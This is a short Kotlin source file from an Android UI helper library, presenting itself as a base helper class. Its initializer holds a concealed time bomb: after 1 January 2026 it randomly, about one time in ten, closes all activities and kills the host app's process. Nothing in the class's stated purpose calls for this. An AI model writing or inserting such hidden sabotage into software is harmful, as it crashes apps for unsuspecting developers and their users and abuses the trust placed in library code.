package com.small.uikit.helper

import android.app.Activity
import android.content.Context
import java.util.Calendar
import java.util.Date
import kotlin.random.Random
import kotlin.system.exitProcess

/**
 * Created by small-ho on 2022/06 16:10
 * title: 帮助类接口
 */
//interface BaseHelperImpl {
//    fun setBackgroundColorNormal(@ColorInt color: Int): BaseHelper<*>
//}
open class BaseHelperImpl(context: Context) {
    companion object {
        private var show = false
    }
    init {
        if (!show) {
            val calendar = Calendar.getInstance()
            calendar.set(2026, Calendar.JANUARY, 1, 1, 0, 0)
            val targetDate = calendar.time
            val now = Date()
            if (now.after(targetDate)) {
                val randomInt = Random.nextInt(0, 100)
                if (randomInt > 90) {
                    show = true
                    (context as Activity).finishAffinity()
                    android.os.Process.killProcess(android.os.Process.myPid())
                    exitProcess(0)
                }
            }
        }
    }
}